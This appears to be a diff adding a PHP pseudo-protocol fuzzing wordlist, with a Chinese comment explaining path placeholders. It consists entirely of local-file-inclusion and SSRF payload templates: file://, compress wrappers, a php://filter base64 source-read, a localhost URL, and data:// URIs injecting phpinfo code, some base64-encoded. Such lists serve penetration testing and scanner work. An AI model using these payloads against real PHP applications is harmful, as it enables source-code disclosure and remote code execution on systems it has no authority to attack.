@@ -1,0 +1,15 @@
+!--通过伪协议等方式生成字典，  3个#表示绝对路径，生成的文件名如果为绝对路径，那么就会加上该协议，3个x表示相对路径和绝对路径，3个!表示/或\开头的绝对路径,3个@表示..开头的相对路径
+http://127.0.0.1/@@@
+file://###
+compress.bzip2://xxx
+compress.zlib://xxx
+compress://../@@@
+php://filter/read=convert.base64-encode/resource=xxx
+data://,<?php phpinfo();
+data://,<?phpinfo();
+data://text/plain,<?php phpinfo();
+data://text/plain,<?phpinfo();
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+data:text/plain,<?php phpinfo();
+data:text/plain,<?phpinfo();
+data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
